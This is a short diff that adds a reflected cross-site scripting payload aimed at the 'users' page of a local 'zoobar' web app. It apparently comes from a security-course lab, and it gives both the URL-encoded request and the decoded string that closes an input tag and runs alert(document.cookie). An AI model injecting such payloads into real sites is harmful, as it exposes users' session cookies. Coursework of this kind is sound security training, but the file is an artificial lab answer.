@@ -1,0 +1,3 @@
+http://localhost:8080/zoobar/index.cgi/users?user=%22%3C%2Finput%3E%3Cscript%3Ealert%28document%2Ecookie%29%3B%3C%2Fscript%3E%3Cinput%20value%3D%22
+
+"</input><script>alert(document.cookie);</script><input value="
